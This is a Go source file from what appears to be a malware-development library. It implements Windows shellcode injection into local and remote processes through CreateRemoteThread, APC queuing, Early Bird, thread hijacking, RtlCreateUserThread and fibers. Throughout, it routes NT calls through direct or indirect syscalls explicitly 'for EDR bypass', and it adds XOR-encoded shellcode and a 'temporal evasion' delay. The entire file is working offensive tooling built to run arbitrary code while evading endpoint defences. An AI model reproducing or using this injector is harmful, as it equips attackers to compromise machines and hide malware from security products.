//go:build windows

package inject

import (
	"fmt"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
	"golang.org/x/sys/windows"
)

// WindowsConfig extends Config with Windows-specific syscall options.
type WindowsConfig struct {
	Config

	// SyscallMethod controls how NT functions are invoked.
	// Default (zero value) is MethodWinAPI — standard API calls.
	// Set to MethodDirect or MethodIndirect for EDR bypass.
	SyscallMethod wsyscall.Method

	// SyscallResolver resolves SSN numbers for Direct/Indirect methods.
	// If nil and SyscallMethod > MethodNativeAPI, defaults to Chain(HellsGate, HalosGate).
	SyscallResolver wsyscall.SSNResolver
}

// DefaultWindowsConfig returns a config with WinAPI method (most compatible).
func DefaultWindowsConfig(method Method, pid int) *WindowsConfig {
	return &WindowsConfig{
		Config:        Config{Method: method, PID: pid},
		SyscallMethod: wsyscall.MethodWinAPI,
	}
}

// caller returns a Caller configured per this config, or nil for WinAPI/NativeAPI.
func (wc *WindowsConfig) caller() *wsyscall.Caller {
	if wc.SyscallMethod <= wsyscall.MethodNativeAPI {
		return nil // use standard api.Proc*.Call()
	}
	r := wc.SyscallResolver
	if r == nil {
		r = wsyscall.Chain(wsyscall.NewHellsGate(), wsyscall.NewHalosGate())
	}
	return wsyscall.New(wc.SyscallMethod, r)
}

// windowsSyscallInjector wraps the standard injector but routes NT calls
// through a syscall.Caller for EDR bypass.
type windowsSyscallInjector struct {
	config *WindowsConfig
	caller *wsyscall.Caller
}

func (w *windowsSyscallInjector) Inject(shellcode []byte) error {
	switch w.config.Method {
	case MethodCreateRemoteThread:
		return w.injectCRT(shellcode)
	case MethodCreateThread:
		return w.injectCT(shellcode)
	case MethodQueueUserAPC:
		return w.injectAPC(shellcode)
	case MethodEarlyBirdAPC:
		return w.injectEarlyBird(shellcode)
	case MethodThreadHijack:
		return w.injectThreadHijack(shellcode)
	case MethodRtlCreateUserThread:
		return w.injectRtl(shellcode)
	case MethodCreateFiber:
		return w.injectFiber(shellcode)
	case MethodDirectSyscall:
		// DirectSyscall already uses raw syscalls; route through our Caller instead.
		return w.injectCT(shellcode)
	default:
		return fmt.Errorf("unknown injection method: %s", w.config.Method)
	}
}

// injectCRT: CreateRemoteThread with NT calls routed through the Caller.
func (w *windowsSyscallInjector) injectCRT(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}
	if w.config.PID == 0 {
		return fmt.Errorf("PID required for CreateRemoteThread")
	}

	hProcess, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|
			windows.PROCESS_QUERY_INFORMATION|
			windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ,
		false,
		uint32(w.config.PID),
	)
	if err != nil {
		return fmt.Errorf("OpenProcess failed: %w", err)
	}
	defer windows.CloseHandle(hProcess)

	addr, err := allocateAndWriteMemoryRemoteWithCaller(hProcess, shellcode, w.caller)
	if err != nil {
		return fmt.Errorf("remote memory setup failed: %w", err)
	}

	// NtCreateThreadEx to create the remote thread via the Caller.
	var hThread uintptr
	r, err := w.caller.Call("NtCreateThreadEx",
		uintptr(unsafe.Pointer(&hThread)),
		uintptr(api.ThreadAllAccess),
		0,
		uintptr(hProcess),
		addr,
		0,
		0, 0, 0, 0, 0,
	)
	if r != 0 {
		return fmt.Errorf("NtCreateThreadEx: NTSTATUS 0x%X: %w", uint32(r), err)
	}
	windows.CloseHandle(windows.Handle(hThread))
	return nil
}

// injectCT: CreateThread (self-injection) with NT calls via the Caller.
func (w *windowsSyscallInjector) injectCT(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}

	// 1. XOR encode shellcode
	encoded, key, err := xorEncodeShellcode(shellcode)
	if err != nil {
		return fmt.Errorf("XOR encoding failed: %w", err)
	}

	currentProcess := uintptr(0xFFFFFFFFFFFFFFFF)

	// 2. NtAllocateVirtualMemory (PAGE_READWRITE)
	var baseAddr uintptr
	regionSize := uintptr(len(encoded))

	r, err := w.caller.Call("NtAllocateVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&baseAddr)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if r != 0 {
		return fmt.Errorf("NtAllocateVirtualMemory: NTSTATUS 0x%X: %w", uint32(r), err)
	}

	// 3. Copy encoded shellcode
	for i, b := range encoded {
		*(*byte)(unsafe.Pointer(baseAddr + uintptr(i))) = b
	}

	// 4. CPU delay (temporal evasion)
	cpuDelay()

	// 5. Decode shellcode in place
	xorDecodeInPlace(baseAddr, len(encoded), key)

	// 6. NtProtectVirtualMemory -> PAGE_EXECUTE_READ
	var oldProtect uint32
	protectAddr := baseAddr
	protectSize := uintptr(len(encoded))

	r, err = w.caller.Call("NtProtectVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&protectAddr)),
		uintptr(unsafe.Pointer(&protectSize)),
		uintptr(windows.PAGE_EXECUTE_READ),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if r != 0 {
		return fmt.Errorf("NtProtectVirtualMemory: NTSTATUS 0x%X: %w", uint32(r), err)
	}

	// 7. NtCreateThreadEx
	var hThread uintptr
	r, err = w.caller.Call("NtCreateThreadEx",
		uintptr(unsafe.Pointer(&hThread)),
		uintptr(api.ThreadAllAccess),
		0,
		currentProcess,
		baseAddr,
		0,
		0, 0, 0, 0, 0,
	)
	if r != 0 {
		return fmt.Errorf("NtCreateThreadEx: NTSTATUS 0x%X: %w", uint32(r), err)
	}

	api.ProcWaitForSingleObject.Call(hThread, 100)
	windows.CloseHandle(windows.Handle(hThread))
	return nil
}

// injectAPC: QueueUserAPC with NT memory calls via the Caller.
func (w *windowsSyscallInjector) injectAPC(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}
	if w.config.PID == 0 {
		return fmt.Errorf("PID required for QueueUserAPC")
	}

	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ,
		false,
		uint32(w.config.PID),
	)
	if err != nil {
		return fmt.Errorf("OpenProcess failed: %w", err)
	}
	defer windows.CloseHandle(hProcess)

	addr, err := allocateAndWriteMemoryRemoteWithCaller(hProcess, shellcode, w.caller)
	if err != nil {
		return fmt.Errorf("remote memory setup failed: %w", err)
	}

	threadIDs, err := findAllThreads(w.config.PID)
	if err != nil {
		return fmt.Errorf("failed to find threads: %w", err)
	}
	if len(threadIDs) == 0 {
		return fmt.Errorf("no threads found for PID %d", w.config.PID)
	}

	success := false
	for _, threadID := range threadIDs {
		hThread, err := windows.OpenThread(
			windows.THREAD_SET_CONTEXT|windows.THREAD_SUSPEND_RESUME,
			false,
			threadID,
		)
		if err != nil {
			continue
		}

		count, _, _ := api.ProcSuspendThread.Call(uintptr(hThread))
		apcRet, _, _ := api.ProcQueueUserAPC.Call(addr, uintptr(hThread), 0)
		windows.ResumeThread(hThread)
		windows.CloseHandle(hThread)

		if apcRet != 0 && count != 0xFFFFFFFF {
			success = true
			break
		}
	}

	if !success {
		return fmt.Errorf("failed to queue APC on any thread")
	}
	return nil
}

// injectEarlyBird: Early Bird APC with NT memory calls via the Caller.
func (w *windowsSyscallInjector) injectEarlyBird(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}

	processPath := w.config.ProcessPath
	if processPath == "" {
		processPath = `C:\Windows\System32\notepad.exe`
	}

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	cmdLine, err := windows.UTF16PtrFromString(processPath)
	if err != nil {
		return fmt.Errorf("UTF16PtrFromString failed: %w", err)
	}

	err = windows.CreateProcess(
		nil, cmdLine, nil, nil, false,
		windows.CREATE_SUSPENDED,
		nil, nil, &si, &pi,
	)
	if err != nil {
		return fmt.Errorf("CreateProcess failed: %w", err)
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	addr, err := allocateAndWriteMemoryRemoteWithCaller(pi.Process, shellcode, w.caller)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("remote memory setup failed: %w", err)
	}

	apcRet, _, _ := api.ProcQueueUserAPC.Call(addr, uintptr(pi.Thread), 0)
	if apcRet == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("QueueUserAPC failed")
	}

	_, err = windows.ResumeThread(pi.Thread)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("ResumeThread failed: %w", err)
	}
	return nil
}

// injectThreadHijack: Thread Execution Hijacking (T1055.003) with NT memory calls via the Caller.
func (w *windowsSyscallInjector) injectThreadHijack(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}

	processPath := w.config.ProcessPath
	if processPath == "" {
		processPath = `C:\Windows\System32\notepad.exe`
	}

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	cmdLine, err := windows.UTF16PtrFromString(processPath)
	if err != nil {
		return fmt.Errorf("UTF16PtrFromString failed: %w", err)
	}

	err = windows.CreateProcess(
		nil, cmdLine, nil, nil, false,
		windows.CREATE_SUSPENDED,
		nil, nil, &si, &pi,
	)
	if err != nil {
		return fmt.Errorf("CreateProcess failed: %w", err)
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	addr, err := allocateAndWriteMemoryRemoteWithCaller(pi.Process, shellcode, w.caller)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("remote memory setup failed: %w", err)
	}

	var ctx context64
	ctx.ContextFlags = contextFull

	retGet, _, _ := api.ProcGetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
	if retGet == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("GetThreadContext failed")
	}

	ctx.Rip = uint64(addr)

	retSet, _, _ := api.ProcSetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
	if retSet == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("SetThreadContext failed")
	}

	windows.ResumeThread(pi.Thread)
	return nil
}

// injectRtl: RtlCreateUserThread with NT memory calls via the Caller.
func (w *windowsSyscallInjector) injectRtl(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}
	if w.config.PID == 0 {
		return fmt.Errorf("PID required for RtlCreateUserThread")
	}

	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|
			windows.PROCESS_CREATE_THREAD,
		false,
		uint32(w.config.PID),
	)
	if err != nil {
		return fmt.Errorf("OpenProcess failed: %w", err)
	}
	defer windows.CloseHandle(hProcess)

	addr, err := allocateAndWriteMemoryRemoteWithCaller(hProcess, shellcode, w.caller)
	if err != nil {
		return fmt.Errorf("remote memory setup failed: %w", err)
	}

	// NtCreateThreadEx via the Caller (replaces RtlCreateUserThread).
	var hThread uintptr
	r, err := w.caller.Call("NtCreateThreadEx",
		uintptr(unsafe.Pointer(&hThread)),
		uintptr(api.ThreadAllAccess),
		0,
		uintptr(hProcess),
		addr,
		0,
		0, 0, 0, 0, 0,
	)
	if r != 0 {
		return fmt.Errorf("NtCreateThreadEx: NTSTATUS 0x%X: %w", uint32(r), err)
	}

	windows.CloseHandle(windows.Handle(hThread))
	return nil
}

// injectFiber: CreateFiber with NT memory calls via the Caller.
func (w *windowsSyscallInjector) injectFiber(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}

	addr, err := allocateAndWriteMemoryLocalWithCaller(shellcode, w.caller)
	if err != nil {
		return fmt.Errorf("memory allocation failed: %w", err)
	}

	mainFiber, _, err := api.ProcConvertThreadToFiber.Call(0)
	if mainFiber == 0 {
		return fmt.Errorf("ConvertThreadToFiber failed: %w", err)
	}

	shellcodeFiber, _, err := api.ProcCreateFiber.Call(0, addr, 0)
	if shellcodeFiber == 0 {
		return fmt.Errorf("CreateFiber failed: %w", err)
	}

	api.ProcSwitchToFiber.Call(shellcodeFiber)
	return nil
}

// NewWindowsInjector creates an injector from a WindowsConfig.
// If the SyscallMethod is WinAPI (default), it delegates to the standard injector.
// Otherwise, it creates a syscall-aware injector that routes NT calls through the Caller.
func NewWindowsInjector(cfg *WindowsConfig) (Injector, error) {
	if cfg == nil {
		return nil, fmt.Errorf("config is nil")
	}
	caller := cfg.caller()
	if caller == nil {
		return &windowsInjector{config: &cfg.Config}, nil
	}
	return &windowsSyscallInjector{config: cfg, caller: caller}, nil
}
